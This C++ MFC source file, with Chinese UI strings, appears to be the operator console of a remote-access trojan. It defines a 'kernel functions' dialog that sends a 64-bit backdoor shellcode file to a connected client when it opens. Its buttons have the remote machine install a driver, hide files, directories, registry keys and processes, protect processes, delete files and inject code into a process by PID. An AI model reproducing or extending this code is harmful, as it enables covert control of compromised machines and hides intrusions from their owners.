// CKernelDlg 对话框
#include "stdafx.h"
#include "Quick.h"
#include "KernelDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

//IMPLEMENT_DYNAMIC(CKernelDlg, CXTPResizeDialog)

CKernelDlg::CKernelDlg(CWnd* pParent, ISocketBase* IOCPServer, ClientContext* ContextObject)
	: CXTPResizeDialog(CKernelDlg::IDD, pParent)
{
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_DEC));
	m_iocpServer = IOCPServer;
	m_pContext = ContextObject;
	m_bOnClose = false;
}



void CKernelDlg::DoDataExchange(CDataExchange* pDX)
{
	CXTPResizeDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_COMBO_MAIN, m_combo_main);
	DDX_Control(pDX, IDC_EDIT_RESULT, m_edit_result);
}

BEGIN_MESSAGE_MAP(CKernelDlg, CXTPResizeDialog)

	ON_BN_CLICKED(IDC_BUTTONINIT, &CKernelDlg::OnBnClickedButtoninit)
	ON_BN_CLICKED(IDC_BUTTON_GetState, &CKernelDlg::OnBnClickedButtonGetstate)
	ON_BN_CLICKED(IDC_BUTTON_SetState_open, &CKernelDlg::OnBnClickedButtonSetstateopen)
	ON_BN_CLICKED(IDC_BUTTON_SetState_close, &CKernelDlg::OnBnClickedButtonSetstateclose)
	ON_BN_CLICKED(IDC_BUTTON_RUNCOMMAND, &CKernelDlg::OnBnClickedButtonRuncommand)
	ON_BN_CLICKED(IDC_BUTTON_DELCOMMAND, &CKernelDlg::OnBnClickedButtonDelcommand)
	ON_BN_CLICKED(IDC_BUTTON_WRITERCOMMAND, &CKernelDlg::OnBnClickedButtonWritercommand)
	ON_BN_CLICKED(IDC_BUTTON_DEL, &CKernelDlg::OnBnClickedButtonDel)
	ON_BN_CLICKED(IDC_BUTTON_SetState_process, &CKernelDlg::OnBnClickedButtonSetstateprocess)
	ON_BN_CLICKED(IDC_BUTTON_INJECT, &CKernelDlg::OnBnClickedButtonInject)
END_MESSAGE_MAP()

// CKernelDlg 消息处理程序

BOOL CKernelDlg::OnInitDialog()
{
	CXTPResizeDialog::OnInitDialog();
	SetIcon(m_hIcon, FALSE);
	CString strString;
	strString.Format(_T("驱动功能 \\\\ %s"), m_pContext->szAddress);
	SetWindowText(strString);

	int i = 0;
	m_combo_main.InsertString(i++, _T("隐藏文件"));
	m_combo_main.InsertString(i++, _T("隐藏目录"));
	m_combo_main.InsertString(i++, _T("隐藏注册表项"));
	m_combo_main.InsertString(i++, _T("隐藏注册表值"));
	m_combo_main.InsertString(i++, _T("保护进程(pid)"));
	m_combo_main.InsertString(i++, _T("保护进程(路径)"));
	m_combo_main.InsertString(i++, _T("-------")); //隐藏进程(pid)
	m_combo_main.InsertString(i++, _T("-------")); //隐藏进程(路径)
	m_combo_main.InsertString(i++, _T("隐藏文件关键文字"));
	m_combo_main.SetCurSel(0);

	//发送64位shellocde
	TCHAR strSelf[MAX_PATH];
	GetModuleFileName(NULL, strSelf, sizeof(strSelf) * sizeof(TCHAR));
	CString FileName = strSelf;
	FileName.Format(_T("%s\\Plugins\\x64\\登录模块.dll_bin"), FileName.Mid(0, FileName.ReverseFind('\\')));
	HANDLE hFile = CreateFile(FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		// MessageBox(_T("读取shellcode后门失败"), _T("错误"), MB_OKCANCEL);	
		return TRUE;
	}
	int ShellcodeSize;
	BYTE* Shellcode;
	ShellcodeSize = GetFileSize(hFile, NULL)+1;
	Shellcode = new BYTE[ShellcodeSize];
	DWORD dwReadsA = 0;
	Shellcode[0] = COMMAND_KERNEL_BACKDOOR;
	ReadFile(hFile, Shellcode+1, ShellcodeSize, &dwReadsA, NULL);
	CloseHandle(hFile);
	m_iocpServer->Send(m_pContext, Shellcode, ShellcodeSize);
	SAFE_DELETE_AR(Shellcode);

	return TRUE;

}

void CKernelDlg::OnReceive()
{
	if (m_pContext == NULL)
		return;
	if (m_bOnClose) 	return;
	CString str;
	str.Format(_T("驱动功能 \\\\ %s  [收包:%d 收:%d KB] [发包:%d 发:%d KB]  "), m_pContext->szAddress, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024));
	SetWindowText(str);
}


void CKernelDlg::OnReceiveComplete(void)
{
	if (m_bOnClose) 	return;
	CString	 strResult=_T("");
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_KERNEL_RETURNINFO:
	{
		RETURNINFO* P_returninfo=(RETURNINFO*)( m_pContext->m_DeCompressionBuffer.GetBuffer());

		switch (P_returninfo->mode)
		{
		case INITSUC:
			GetDlgItem(IDC_BUTTONINIT)->EnableWindow(FALSE);
			GetDlgItem(IDC_BUTTON_RUNCOMMAND)->EnableWindow(TRUE);
			GetDlgItem(IDC_BUTTON_DELCOMMAND)->EnableWindow(TRUE);

		break;
		case INITUNSUC:
			GetDlgItem(IDC_BUTTONINIT)->EnableWindow(TRUE);
			GetDlgItem(IDC_BUTTON_RUNCOMMAND)->EnableWindow(FALSE);
			GetDlgItem(IDC_BUTTON_DELCOMMAND)->EnableWindow(FALSE);
			break;
		case COMMANDERROR:
			break;
		default:
			break;
		}
		 strResult = P_returninfo->info;
		
	}
	break;

	default:
		break;
	}
	strResult += _T("\r\n");
	m_edit_result.ReplaceSel(strResult);
}

void CKernelDlg::OnCancel()
{
	if (m_bOnClose) return;
	m_bOnClose = TRUE;
	m_iocpServer->Disconnect(m_pContext);
	DestroyIcon(m_hIcon);
	if (IsWindow(m_hWnd))
		DestroyWindow();
}


void CKernelDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnCancel();
	CXTPResizeDialog::PostNcDestroy();
	delete this;
}





void CKernelDlg::OnBnClickedButtoninit()
{
	BYTE	bToken[2] = { COMMAND_KERNEL_INIT, 0 };
	if (MessageBox(_T("需要断网安装驱动吗(不支持32位客户端)"), _T("断网"), MB_OKCANCEL) == IDOK)
	{
			bToken[1] = 0x1;
	}
	m_iocpServer->Send(m_pContext, bToken, 2);
}


void CKernelDlg::OnBnClickedButtonGetstate()
{
	BYTE bToken = COMMAND_KERNEL_GETSTATE;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CKernelDlg::OnBnClickedButtonSetstateopen()
{
	BYTE bToken = COMMAND_KERNEL_SETSTATE_CONTINUE;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CKernelDlg::OnBnClickedButtonSetstateprocess()
{
	BYTE bToken = COMMAND_KERNEL_SETSTATE_PROCESS;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CKernelDlg::OnBnClickedButtonSetstateclose()
{
	BYTE bToken = COMMAND_KERNEL_SETSTATE_STOP;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CKernelDlg::OnBnClickedButtonRuncommand()
{
	RUNCOMMAND* m_runcommand = new RUNCOMMAND;
	ZeroMemory(m_runcommand, sizeof(RUNCOMMAND));
	m_runcommand->Token = COMMAND_KERNEL_RUNCOMMAND;
	m_runcommand->argc = m_combo_main.GetCurSel();
	CString cscommand;;
	((CEdit*)GetDlgItem(IDC_EDIT_COMMAND))->GetWindowTextW(cscommand);
	memcpy(m_runcommand->Command, cscommand.GetBuffer(), cscommand.GetLength() * +2);
	m_iocpServer->Send(m_pContext, (BYTE*)m_runcommand, sizeof(RUNCOMMAND));
	SAFE_DELETE(m_runcommand);
}

void CKernelDlg::OnBnClickedButtonDelcommand()
{
	CString cscommand;;
	((CEdit*)GetDlgItem(IDC_EDIT_COMMAND))->GetWindowTextW(cscommand);
	if (m_combo_main.GetCurSel() == 4 || m_combo_main.GetCurSel() == 5)
	{
		CString str;
		str.Format(_T("确定取消PID %s 的保护吗？"), cscommand);
		if (MessageBox(str, _T("只支持单个按PID取消保护"), MB_OKCANCEL) != IDOK)
			return;
	}
	
	if (m_combo_main.GetCurSel() == 6 || m_combo_main.GetCurSel() == 7)
	{
		if (MessageBox(_T("确定取消所有类型进程隐藏吗？"), _T("取消进程隐藏"), MB_OKCANCEL) != IDOK)
			return;
	}



	RUNCOMMAND* m_runcommand = new RUNCOMMAND;
	ZeroMemory(m_runcommand, sizeof(RUNCOMMAND));
	m_runcommand->Token = COMMAND_KERNEL_DELCOMMAND;
	m_runcommand->argc = m_combo_main.GetCurSel();
	memcpy(m_runcommand->Command, cscommand.GetBuffer(), cscommand.GetLength() * +2);
	m_iocpServer->Send(m_pContext, (BYTE*)m_runcommand, sizeof(RUNCOMMAND));
	SAFE_DELETE(m_runcommand);
}





void CKernelDlg::OnBnClickedButtonWritercommand()
{
	
	RUNCOMMAND* m_runcommand = new RUNCOMMAND;
	ZeroMemory(m_runcommand, sizeof(RUNCOMMAND));
	m_runcommand->Token = COMMAND_KERNEL_WRITERCOMMAND;
	m_runcommand->argc = m_combo_main.GetCurSel();
	CString cscommand;;
	((CEdit*)GetDlgItem(IDC_EDIT_COMMAND))->GetWindowTextW(cscommand);
	memcpy(m_runcommand->Command, cscommand.GetBuffer(), cscommand.GetLength() * +2);
	m_iocpServer->Send(m_pContext, (BYTE*)m_runcommand, sizeof(RUNCOMMAND));
	SAFE_DELETE(m_runcommand);


}



void CKernelDlg::OnBnClickedButtonDel()
{
	CString cscommand;
	((CEdit*)GetDlgItem(IDC_EDIT_COMMAND))->GetWindowTextW(cscommand);
	int len = cscommand.GetLength()*2 + 3;

	BYTE* lpbuffer = new BYTE[len];
	lpbuffer[0]= COMMAND_KERNEL_DEL;
	memcpy(lpbuffer + 1, cscommand.GetBuffer(), cscommand.GetLength()*2+2);
	m_iocpServer->Send(m_pContext, lpbuffer, len);
	SAFE_DELETE_AR(lpbuffer);
}




void CKernelDlg::OnBnClickedButtonInject()
{
	CString cscommand;
	((CEdit*)GetDlgItem(IDC_EDIT_COMMAND))->GetWindowTextW(cscommand);
	int len = cscommand.GetLength() * 2 + 3;
	if (len<4&&len>15)
	{
		CString	 strResult = _T("");
		strResult += _T("注入进程填写X64进程的pid   (1234)\r\n");
		m_edit_result.ReplaceSel(strResult);
		return;
	}
	BYTE* lpbuffer = new BYTE[len];
	lpbuffer[0] = COMMAND_KERNEL_INJECT;
	memcpy(lpbuffer + 1, cscommand.GetBuffer(), cscommand.GetLength() * 2 + 2);
	m_iocpServer->Send(m_pContext, lpbuffer, len);
	SAFE_DELETE_AR(lpbuffer);
}
